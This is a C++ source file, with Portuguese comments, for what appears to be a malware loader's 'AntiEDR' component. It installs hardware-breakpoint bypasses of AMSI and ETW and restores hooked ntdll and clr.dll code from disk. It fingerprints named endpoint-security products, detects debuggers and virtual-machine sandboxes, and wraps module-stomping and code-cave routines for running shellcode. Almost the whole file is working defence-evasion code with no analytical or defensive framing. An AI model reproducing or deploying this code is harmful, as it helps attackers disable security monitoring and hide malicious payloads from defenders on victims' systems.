#include "anti_edr.h"
#include "../utils/logger.h"
#include "module_stomping.h"
#include "code_cave.h"
#include <psapi.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <intrin.h>

// ======================================================================
// Estrutura PEB personalizada
// ======================================================================
typedef struct _MY_PEB
{
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    BYTE Reserved3[2];
    DWORD Ldr;
    BYTE Reserved4[4];
    PVOID ProcessParameters;
    BYTE Reserved5[52];
    DWORD NtGlobalFlag;
} MY_PEB, * PMY_PEB;

// ======================================================================
// Hardware breakpoints para AMSI/ETW
// ======================================================================
static PVOID g_vectoredHandler = nullptr;
static bool g_amsiEtwInstalled = false;

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        PVOID rip = (PVOID)ExceptionInfo->ContextRecord->Rip;
        PVOID amsiAddr = GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer");
        PVOID etwAddr = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");

        if (rip == amsiAddr)
        {
            ExceptionInfo->ContextRecord->Rax = 0;
            ExceptionInfo->ContextRecord->Rip += 5;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if (rip == etwAddr)
        {
            ExceptionInfo->ContextRecord->Rax = 0;
            ExceptionInfo->ContextRecord->Rip += 5;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// ======================================================================
// AMSI/ETW bypass
// ======================================================================
bool AntiEDR::InstallAmsiEtwBypass()
{
    if (g_amsiEtwInstalled) return true;

    g_vectoredHandler = AddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (!g_vectoredHandler) return false;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx))
    {
        RemoveVectoredExceptionHandler(g_vectoredHandler);
        return false;
    }

    PVOID amsi = GetProcAddress(GetModuleHandleW(L"amsi.dll"), "AmsiScanBuffer");
    PVOID etw = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");

    ctx.Dr0 = (DWORD64)amsi;
    ctx.Dr1 = (DWORD64)etw;
    ctx.Dr7 = (1 << 0) | (1 << 2) | (1 << 4) | (1 << 6);
    ctx.Dr7 |= (0 << 16) | (0 << 20);
    ctx.Dr7 |= (1 << 17) | (1 << 21);

    if (!SetThreadContext(GetCurrentThread(), &ctx))
    {
        RemoveVectoredExceptionHandler(g_vectoredHandler);
        return false;
    }

    g_amsiEtwInstalled = true;
    LOG_INFO(L"AMSI/ETW bypass instalado");
    return true;
}

void AntiEDR::RemoveAmsiEtwBypass()
{
    if (!g_amsiEtwInstalled) return;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = ctx.Dr1 = 0;
    ctx.Dr7 = 0;
    SetThreadContext(GetCurrentThread(), &ctx);

    if (g_vectoredHandler)
        RemoveVectoredExceptionHandler(g_vectoredHandler);

    g_amsiEtwInstalled = false;
    LOG_INFO(L"AMSI/ETW bypass removido");
}

// ======================================================================
// Unhook do ntdll
// ======================================================================
bool AntiEDR::UnhookNtdll()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    wchar_t systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(systemPath, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    std::vector<BYTE> cleanDll(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, cleanDll.data(), fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    HMODULE hClean = LoadLibraryExW(systemPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hClean) return false;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(pSection[i].Name, ".text", 5) == 0)
        {
            BYTE* textStart = (BYTE*)hNtdll + pSection[i].VirtualAddress;
            SIZE_T textSize = pSection[i].Misc.VirtualSize;

            PIMAGE_SECTION_HEADER pCleanSection = IMAGE_FIRST_SECTION((PIMAGE_NT_HEADERS)((BYTE*)hClean + pDos->e_lfanew));
            for (WORD j = 0; j < ((PIMAGE_NT_HEADERS)((BYTE*)hClean + pDos->e_lfanew))->FileHeader.NumberOfSections; j++)
            {
                if (memcmp(pCleanSection[j].Name, ".text", 5) == 0)
                {
                    BYTE* cleanText = (BYTE*)hClean + pCleanSection[j].VirtualAddress;
                    DWORD oldProtect;
                    VirtualProtect(textStart, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
                    memcpy(textStart, cleanText, textSize);
                    VirtualProtect(textStart, textSize, oldProtect, &oldProtect);
                    LOG_INFO(L"ntdll .text restaurado");
                    break;
                }
            }
            break;
        }
    }

    FreeLibrary(hClean);
    return true;
}

// ======================================================================
// Unhook do CLR (nLoadImage)
// ======================================================================
bool AntiEDR::UnhookCLR()
{
    HMODULE hClr = GetModuleHandleW(L"clr.dll");
    if (!hClr) return false;

    PVOID nLoadImage = GetProcAddress(hClr, "AssemblyNative::LoadImage");
    if (!nLoadImage) nLoadImage = GetProcAddress(hClr, "nLoadImage");
    if (!nLoadImage) return false;

    wchar_t systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\clr.dll");

    HANDLE hFile = CreateFileW(systemPath, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    std::vector<BYTE> cleanDll(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, cleanDll.data(), fileSize, &bytesRead, nullptr);
    CloseHandle(hFile);

    HMODULE hClean = LoadLibraryExW(systemPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hClean) return false;

    PVOID cleanAddr = GetProcAddress(hClean, "AssemblyNative::LoadImage");
    if (!cleanAddr) cleanAddr = GetProcAddress(hClean, "nLoadImage");
    if (!cleanAddr) { FreeLibrary(hClean); return false; }

    DWORD offset = (DWORD)((BYTE*)cleanAddr - (BYTE*)hClean);
    FreeLibrary(hClean);

    if (offset + 64 > cleanDll.size()) return false;

    DWORD oldProtect;
    VirtualProtect(nLoadImage, 64, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(nLoadImage, &cleanDll[offset], 64);
    VirtualProtect(nLoadImage, 64, oldProtect, &oldProtect);

    LOG_INFO(L"CLR Unhook aplicado em 0x%p", nLoadImage);
    return true;
}

// ======================================================================
// Detecção de EDRs
// ======================================================================
std::vector<std::wstring> AntiEDR::DetectEDRs()
{
    std::vector<std::wstring> found;
    const wchar_t* edrs[] = {
        L"csagent.dll", L"csfalcon.dll", L"sentinelone.dll",
        L"mssense.dll", L"cylance.dll", L"cb64.dll", L"ccme64.dll",
        L"sysmon.dll", L"epp64.dll", L"avghookx.dll"
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(hSnap, &me))
        {
            do {
                for (auto& e : edrs)
                    if (_wcsicmp(me.szModule, e) == 0) {
                        found.push_back(me.szModule);
                        break;
                    }
            } while (Module32NextW(hSnap, &me));
        }
        CloseHandle(hSnap);
    }
    return found;
}

// ======================================================================
// Anti-debug e Sandbox
// ======================================================================
bool AntiEDR::CheckDebugger()
{
    PMY_PEB peb = (PMY_PEB)__readgsqword(0x60);
    if (!peb) return false;
    if (peb->BeingDebugged) return true;
    if (peb->NtGlobalFlag & 0x70) return true;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx))
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;

    return false;
}

bool AntiEDR::CheckSandbox()
{
    const wchar_t* procs[] = { L"vmtoolsd.exe", L"vmwaretray.exe", L"vboxservice.exe", L"vboxtray.exe" };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe))
        {
            do {
                for (auto& p : procs)
                    if (_wcsicmp(pe.szExeFile, p) == 0) { CloseHandle(hSnap); return true; }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    MEMORYSTATUSEX mem = { sizeof(mem) };
    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;

    return false;
}

void AntiEDR::ApplyAntiDebug()
{
    PMY_PEB peb = (PMY_PEB)__readgsqword(0x60);
    if (peb) peb->BeingDebugged = 0;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx))
    {
        ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
        ctx.Dr7 = 0;
        SetThreadContext(GetCurrentThread(), &ctx);
    }
}

// ======================================================================
// ApplyAll – integra tudo
// ======================================================================
void AntiEDR::ApplyAll()
{
    LOG_INFO(L"Aplicando todas as tecnicas anti-EDR...");
    ApplyAntiDebug();
    InstallAmsiEtwBypass();
    UnhookNtdll();
    UnhookCLR();
    LOG_INFO(L"Tecnicas anti-EDR aplicadas");
}

// ======================================================================
// Wrappers para ModuleStomping e CodeCave
// ======================================================================
bool AntiEDR::StompModule(const wchar_t* moduleName, const BYTE* shellcode, SIZE_T size)
{
    return ModuleStomping::Stomp(moduleName, shellcode, size);
}

void AntiEDR::RestoreStompedModule()
{
    ModuleStomping::Restore();
}

PVOID AntiEDR::AllocateCodeCave(SIZE_T size)
{
    return CodeCaveManager::Allocate(size);
}

void AntiEDR::FreeCodeCave(PVOID address)
{
    CodeCaveManager::Free(address);
}

// ======================================================================
// Initialize e Cleanup
// ======================================================================
bool AntiEDR::Initialize()
{
    LOG_INFO(L"AntiEDR inicializado");
    CodeCaveManager::Initialize();
    return true;
}

void AntiEDR::Cleanup()
{
    ModuleStomping::Restore();
    RemoveAmsiEtwBypass();
    LOG_INFO(L"AntiEDR finalizado");
}